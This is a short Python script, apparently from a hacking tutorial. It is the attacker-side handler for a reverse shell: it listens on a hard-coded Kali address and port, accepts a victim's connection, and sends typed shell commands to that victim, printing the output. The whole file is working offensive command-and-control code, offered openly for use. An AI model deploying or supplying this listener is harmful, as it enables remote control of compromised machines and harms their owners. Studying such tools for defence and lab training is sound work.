import socket # For Building TCP Connection
import subprocess # To start the shell in the system
def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's'

    s.bind(("192.168.86.11", 5000)) # define the kali IP and the listening port

    s.listen(1) # define the backlog size, since we are expecting a single connection from a single
                                                            # target we will listen to one connection

    print('[+] Listening for incoming TCP connection on port 5000')

    conn, addr = s.accept() # accept() function will return the connection object ID (conn) and will return the client(target) IP address and source
                                # port in a tuple format (IP,port)

    print('[+] We got a connection from: ', addr)


    while True:

        command = input("Shell> ") # Get user input and store it in command variable

        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
            conn.send('terminate'.encode('utf-8'))
            conn.close()
            break

        else:

            conn.send(command.encode("utf-8")) # Otherwise we will send the command to the target
            print(conn.recv(1024).decode("utf-8")) # and print the result that we got back
           


def main():
    connect()
main()